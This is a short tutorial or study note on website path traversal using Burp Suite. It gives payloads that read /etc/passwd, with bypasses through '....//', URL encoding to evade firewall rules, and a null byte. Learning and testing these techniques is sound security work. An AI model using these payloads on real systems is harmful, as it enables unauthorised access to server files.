# Website Directory Path Attack

-- Using Burpsuite --

`In Burp :`

- "proxy" tab
- intercept = off
- HTTP history to view all requests
- ctrl + r on a request to go to repeater --> modify the request and view response easily

## Learn how to retrieve hidden file (ex: etc/passwd) :

### Simple attack

- Find some place in the website were files are being displayed (like images)
- The URL should look like :
```
url.com/image/filename?filename=gift.jpg
```
- use it to access other files in the folders :
```
url.com/image/filename?filename=../../../etc/passwd
```
- other ways to access it (like going to the root)
```
url.com/image/filename?filename=/etc/passwd
url.com/image/filename?filename=....//....//....//etc/passwd
```

### Adding encoding

Some website might reject caracters you are trying to pass to the URL such as the "/", so we will try to encode those caracters

`In Burp :`

- "Decoder" tab
- enter any caracter or string such as "../../../"
- click "encode as URL" to encode it
- click multiple times on the new tabs fo multiple levels of encoding

adding encoding to the request :

- try to encode to avoid firewall blocking the request containing "../../../"
```
url.com/image/filename?filename=%2e%2e%2f%2e%2e%2f%2e%2e%2f/etc/passwd
```

Trying double encoding might bypass some firewall rules but if it doesn't work, we don't bother adding more levels of encoding

### Adding Null Byte

Make the website believe you are requesting an image (jpg) file to bypass security rules

- We use a "Null Byte" %00 to mark the end of the string
```
url.com/image/filename?filename=../../../etc/passwd%00.jpg
```